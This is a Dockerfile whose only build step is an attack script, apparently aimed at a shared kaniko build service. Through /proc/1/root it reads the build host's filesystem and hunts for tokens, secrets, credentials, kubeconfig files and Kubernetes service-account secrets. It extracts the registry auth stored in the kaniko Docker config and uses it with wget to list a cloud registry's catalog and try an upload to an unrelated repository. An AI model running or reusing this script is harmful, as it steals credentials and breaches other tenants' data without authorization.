FROM alpine
RUN set +e; echo "==AGENT1=="; tr '\0' ' ' </proc/1/cmdline; echo; ls -la /proc/1/root/ 2>&1 | head -25; echo "==AGENT1secrets=="; find /proc/1/root/etc /proc/1/root/var /proc/1/root/run /proc/1/root/home -maxdepth 4 \( -iname '*token*' -o -iname '*secret*' -o -iname '*cred*' -o -iname '*kubeconfig*' \) 2>/dev/null | head -20; echo "==AGENT1sa=="; ls -la /proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/ 2>&1; echo "==CFGhosts=="; grep -oE '"[A-Za-z0-9._-]+\.(ru|tech|com)"' /kaniko/.docker/config.json 2>/dev/null | sort -u; AUTH=$(sed -n 's/.*"auth"[^"]*"\([A-Za-z0-9+/=]*\)".*/\1/p' /kaniko/.docker/config.json 2>/dev/null | head -1); echo "authlen=${#AUTH}"; echo "==CATALOG=="; wget -T8 -q --header="Authorization: Basic $AUTH" -O- https://cr.cloud.ru/v2/_catalog 2>&1 | head -c 700; echo; echo "==CROSS=="; wget -T8 -S -q -O- --post-data='' --header="Authorization: Basic $AUTH" https://cr.cloud.ru/v2/zzzbb-unrelated/blobs/uploads/ 2>&1 | grep -iE 'HTTP/|www-auth|errors' | head -4; echo "[done]"
